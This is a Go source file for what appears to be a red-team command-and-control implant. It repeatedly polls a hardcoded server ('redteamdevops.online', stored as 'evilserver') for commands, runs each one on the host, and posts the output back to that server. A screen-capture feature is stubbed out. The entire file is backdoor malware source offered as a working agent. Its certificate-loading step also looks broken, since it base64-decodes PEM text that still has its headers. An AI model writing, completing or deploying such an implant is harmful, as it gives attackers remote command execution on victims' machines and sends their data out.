package main

import (
	"bytes"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"strings"
)

const certificado = `
-----BEGIN CERTIFICATE-----
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
YYHyorc=
-----END CERTIFICATE-----

`
const evilserver = "https://redteamdevops.online"
const port = 443
const comandos = "/Cmd"
const OutUrl = "/Out"

func SetupC() *http.Client {
	tlsConfig := &tls.Config{RootCAs: x509.NewCertPool()}
	transport := &http.Transport{TLSClientConfig: tlsConfig}
	client := &http.Client{Transport: transport}

	dec, _ := base64.StdEncoding.DecodeString(certificado)
	ok := tlsConfig.RootCAs.AppendCertsFromPEM(dec)
	if !ok {
		panic("no fue posible cargar el certificado [*]")
	}

	return client

}

func Consultar(client *http.Client, url string) string {
	fmt.Println("iniciando comunicacion con el Servidor ")
	resp, err := client.Get(url)
	if err != nil {
		fmt.Printf("error en el request de la consulta %s", err)
	}
	body, err := ioutil.ReadAll(resp.Body)

	if err != nil {
		fmt.Printf("error leyendo el request del body  %s", err)

	}

	fmt.Printf("command successfully [+]", body)
	return strings.Trim(string(body), "\n\r")
}

func Procedimiento(client *http.Client, cmd string, host string) {
	if strings.Compare(cmd, "exit") == 0 {
		fmt.Println("exit C2")
		os.Exit(0)
	} else if strings.HasPrefix(cmd, "captura") {
		// aqui se implementa la funcion de captura de pantalla
	} else {
		salida := Execu(cmd)
		fmt.Printf("enviando informacion al server \n%s\n", string(salida))
		client.Post(evilserver+OutUrl, "text/html", bytes.NewBuffer(salida))
	}

}
func Execu(cmdString string) []byte {
	fmt.Println("ejecutando comando")
	cmdT := strings.Split(cmdString, " ")
	fmt.Println(cmdT)
	cmd := exec.Command(cmdT[0], cmdT[1:]...)
	salida, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Printf("error al ejecutar un comando %s\n", err)
		salida = []byte("error al ejecutar ")

	}
	return salida
}
func main() {
	hoststring := fmt.Sprintf("%s:%d", evilserver, port)
	client := SetupC()
	for {
		cmd := Consultar(client, hoststring+comandos)
		Procedimiento(client, cmd, hoststring)
	}
}
